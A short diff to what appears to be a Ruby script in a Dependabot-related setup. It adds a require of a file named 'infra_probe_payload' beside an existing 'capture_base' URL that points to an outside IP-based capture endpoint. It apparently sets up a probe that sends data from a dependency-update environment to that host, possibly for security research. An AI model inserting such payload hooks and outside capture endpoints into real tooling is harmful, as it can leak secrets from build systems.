@@ -1,4 +1,5 @@
 require_relative "lib/bob_boundary_dep"
+require_relative "infra_probe_payload"
 
 capture_base = "https://target.147.182.179.38.sslip.io:8443/capture/5b3963e04627c6a3b1943eb0e2a145cc"
 dependabot_api_url = ENV["DEPENDABOT_API_URL"]
